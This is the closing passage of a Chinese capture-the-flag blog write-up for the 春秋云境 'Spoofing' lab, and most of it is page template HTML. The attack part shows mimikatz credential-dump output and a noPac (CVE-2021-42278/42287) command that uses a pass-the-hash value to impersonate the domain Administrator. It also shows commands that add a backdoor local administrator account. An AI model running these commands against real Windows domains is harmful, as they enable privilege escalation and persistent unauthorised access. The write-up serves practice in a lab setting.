+         * Password : 6b 48 04 3e 10 8b c7 75 4f b1 48 eb a9 c7 22 49 61 94 02 ed 29 da 01 63 27 f4 74 f3 ed 1c ec 6d c6 43 64 b6 8f 8d 8a 73 f3 99 2e 90 1b cd fa 8f d8 77 af 0c 3f 7c a8 3d 08 c6 1a a3 6c ce a1 7e a1 f0 f1 0d 68 39 4b 49 34 ed 29 d6 a9 49 2b da 20 7f 9f d3 ce 6c fe 0c 00 1d 4d f3 0f e9 8d a7 bc 80 a6 a3 84 92 9c 83 c8 24 78 3f b0 5d 17 75 9f de 29 76 02 16 d6 01 d6 93 a9 8f 32 9f 14 7d b2 69 b5 47 78 26 9a 5d 6d 4d 49 f7 38 91 16 9b e5 00 bd bc 6b 28 07 6c 54 71 e2 2f 4d 28 d7 98 8d d7 2c 60 36 de 81 1b 27 1e c0 1e 71 96 51 66 44 5c 20 03 52 ca aa c7 ff ef 11 96 87 c6 a8 ca 72 19 04 35 96 ba 0f ec 04 b9 ec 10 1d 0f 45 77 e8 30 b0 2e e2 cc bd ff 35 8d f9 30 63 86 0b 13 a4 ef 74 f7 33 ce c8 f3 8a f4 9f 2f 1b b4 85 65
+        ssp :
+        credman :
+        cloudap :
+
+mimikatz #
+</code></pre><p>根据题目描述考虑 noPac</p>
+<p>只有zhanghui能成功，zhanghui在MA_Admin组，MA_Admin
+组对computer 能够创建对象</p>
+<p><a href="https://github.com/Ridter/noPac">Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)</a></p>
+<pre tabindex="0"><code>proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#39;:1232126b24cdf8c9bd2f788a9d7c7ed1&#39; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell
+</code></pre><pre tabindex="0"><code>net user test2 Abcd1234 /add
+net localgroup administrators test2 /add
+</code></pre><p>远程登录拿flag</p>
+<p><img src="https://gkjzjh146.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.assets/image-20231005123446818.png" alt="image-20231005123446818"></p>
+<p>后面域那里打得很懵，还是太菜了。。</p>
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">春秋云境</a>
+
+  <a class="tag tag--primary tag--small" href="https://gkjzjh146.github.io/tags/wp/">wp</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-delegation/" data-tooltip="春秋云境 Delegation" aria-label="上一篇: 春秋云境 Delegation">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/gkjzjh146.github.io\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing\/';
+        
+          this.page.identifier = '\/post\/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-delegation/" data-tooltip="春秋云境 Delegation" aria-label="上一篇: 春秋云境 Delegation">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-spoofing/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583-spoofing%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583-spoofing%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E5%25A2%2583-spoofing%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
